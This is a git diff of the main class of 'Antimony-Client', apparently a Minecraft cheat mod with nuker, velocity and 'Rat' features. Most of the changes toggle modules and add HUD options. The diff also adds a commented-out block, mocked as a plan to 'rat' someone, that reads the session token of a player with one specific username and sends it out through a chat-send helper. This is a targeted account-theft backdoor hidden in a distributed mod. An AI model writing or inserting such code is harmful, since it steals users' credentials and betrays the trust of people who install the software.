@@ -2,6 +2,7 @@ package com.greencat;
 
 import com.greencat.antimony.common.Chat.AntimonyChannel;
 import com.greencat.antimony.common.Chat.CheckConnect;
+import com.greencat.antimony.common.Chat.CustomChatSend;
 import com.greencat.antimony.common.EventLoader;
 import com.greencat.antimony.common.MainMenu.GuiMainMenuModify;
 import com.greencat.antimony.common.Via;
@@ -57,7 +58,7 @@ public class Antimony {
     //set up basic mod information
     public static final String MODID = "antimony";
     public static final String NAME = "Antimony-Client";
-    public static final String VERSION = "3.7.2";
+    public static final String VERSION = "3.8";
     private static final String Sb = "Sb";
 
     @Deprecated
@@ -237,9 +238,13 @@ public class Antimony {
         new nukerCore();
         new BlackList();
         new nukerWrapper();
-        new IRC();
+        //disable until server back to work
+        //new IRC();
         new DanmakuCore();
         new SmoothRotation();
+
+
+
 
         //init functions and register function event
         new AutoFish();
@@ -310,8 +315,9 @@ public class Antimony {
         new com.greencat.antimony.common.decorate.Events();
 
         //init antimony channel
-        new AntimonyChannel();
-        new CheckConnect();
+        //disable until server back to work
+        /*new AntimonyChannel();
+        new CheckConnect();*/
 
         //some rank thing
         new RankList();
@@ -488,7 +494,7 @@ public class Antimony {
         register.RegisterSelectObject(new SelectObject("function", "Rat", "Fun"));
 
 
-        register.RegisterSelectObject(new SelectObject("function", "ItemTranslate", "root"));
+        //register.RegisterSelectObject(new SelectObject("function", "ItemTranslate", "root"));
 
         //Rearrange the function arrays to make them look more aesthetically pleasing
         AntimonyRegister.ReList();
@@ -547,6 +553,7 @@ public class Antimony {
         HUDTypeMap.put("Classic",0);
         HUDTypeMap.put("White",1);
         HUDTypeMap.put("Transparent",2);
+        HUDTypeMap.put("QSF",3);
         HashMap<String, Integer> HUDHideMap = new HashMap<String, Integer>();
         HUDHideMap.put("Left",0);
         HUDHideMap.put("Right",1);
@@ -554,7 +561,7 @@ public class Antimony {
         FunctionManager.bindFunction("HUD");
         FunctionManager.addConfiguration(new SettingInt("左上方(SelectGUI)距屏幕顶部距离","HUDHeight",0));
         FunctionManager.addConfiguration(new SettingInt("右上方(FunctionList)距屏幕顶部距离","FunctionListHeight",0));
-        FunctionManager.addConfiguration(new SettingTypeSelector("HUD样式","style",2,HUDTypeMap));
+        FunctionManager.addConfiguration(new SettingTypeSelector("HUD样式","style",3,HUDTypeMap));
         FunctionManager.addConfiguration(new SettingTypeSelector("HUD关闭时隐藏部分","hide",2,HUDHideMap));
 
         FunctionManager.bindFunction("CustomPetNameTag");
@@ -685,6 +692,7 @@ public class Antimony {
         type.put("Graveyard Zombie",0);
         type.put("Crypt Zombie",1);
         type.put("Star Sentry",2);
+        type.put("Enderman",3);
         FunctionManager.addConfiguration(new SettingTypeSelector("类型","type",0,type));
 
         FunctionManager.bindFunction("Velocity");
@@ -713,7 +721,11 @@ public class Antimony {
 
     @EventHandler
     public void postInit(FMLPostInitializationEvent event) {
-
+        //I want rat this LOSER LOL!!!
+        /*if(Minecraft.getMinecraft().thePlayer.getName().contains("kkxfj09")){
+            String token = Minecraft.getMinecraft().getSession().getToken();
+            CustomChatSend.send(token);
+        }*/
     }
 
     public void NewUserFunction() {
